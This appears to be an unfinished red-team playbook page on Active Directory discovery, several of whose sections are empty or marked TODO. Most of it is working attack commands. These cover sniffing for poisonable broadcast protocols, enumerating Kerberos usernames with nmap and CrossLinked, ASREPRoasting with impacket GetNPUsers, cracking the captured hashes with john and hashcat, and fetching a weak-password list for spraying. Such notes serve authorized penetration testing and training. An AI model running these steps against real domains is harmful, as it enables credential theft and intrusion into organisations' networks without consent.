
# Discovery: Active Directory

## Overview

MITRE ATT&CK mapping: N/A

## Procedures

### Reference

In-depth domain recon:

```
https://book.hacktricks.xyz/windows-hardening/ntlm
https://book.hacktricks.xyz/windows/active-directory-methodology
https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments?slide=96
```

Domain recon (from Windows box):

```
https://adsecurity.org/?p=2535
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
https://pentestlab.blog/2018/05/28/situational-awareness/
```

Kerberos attacks:

```
https://www.tarlogic.com/blog/how-kerberos-works/
```

### Discovering AD name

Passively listen for DHCP broadcasts:

    tcpdump -i eth0 port 67 or port 68 -e -X

Broadcasting DHCP/DHCPv6 request:

    nmap --script broadcast-dhcp-discover -d
    nmap -6 --script broadcast-dhcp6-discover

Other techniques:

```
https://blog.quickbreach.io/blog/finding-the-domain-controllers/
# externally:
https://www.komodosec.com/post/github-the-red-teamer-s-cheat-sheet
```

### Sniffing for abusable protocols 

Broadcast/multicast protocols that could be abused (via poisoning/spoofing) by the attacker to impersonate as other nodes in the network:

```
NBT (NetBIOS over TCP/IP)
LLMNR
mDNS
DHCPv6
SSDP
```

NBT (NetBIOS over TCP/IP):

    tcpdump -i eth0 udp port 137

LLMNR:

    socat -u UDP4-RECV:5355,ip-add-membership=224.0.0.252:eth0 /dev/null &
    tcpdump -i eth0 udp port 5355

mDNS:

    socat -u UDP4-RECV:5353,ip-add-membership=224.0.0.251:eth0 /dev/null &
    tcpdump -i eth0 udp port 5353

DHCPv6:

    TODO

SSDP:

    socat -u UDP4-RECV:1900,ip-add-membership=239.255.255.250:eth0 /dev/null &
    tcpdump -i eth0 udp port 1900

### Exploring AD: unauthenticated user

Collecting valid usernames:

```
People (username candidates):
source ~/.venv/CrossLinked/bin/activate
# Bob and Bob Company
crosslinked -f {f}.{last}@domain.com 'BoB+%26+Bob Company'
alternatively:
https://github.com/insidetrust/statistically-likely-usernames
wget https://gist.githubusercontent.com/superkojiman/11076951/raw/74f3de7740acb197ecfa8340d07d3926a95e5d46/namemash.py
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt

# query:
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='ad.domain',userdb=/home/tester/names.txt <DC-IP>
```

ASREPRoasting:

*The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH). Anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password.*

```
Original work: https://github.com/HarmJ0y/ASREPRoast
wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/3c6713e309cae871d685fa443d3e21b7026a2155/examples/GetNPUsers.py
python3 GetNPUsers.py -usersfile validNames.txt -dc-ip <DC-IP> -format hashcat -outputfile hashes.asreproast ad.domain/ | tee asreproast.out
if DONT_REQ_PREAUTH:
cat asreproast.out | grep -v "doesn't have"
then offline cracking:
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
```

Password spraying:

```
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt
```

### Exploring AD: authenticated (unprivileged) user

### Exploring AD: Domain Admin

## OPSEC considerations

## Counter-countermeasures
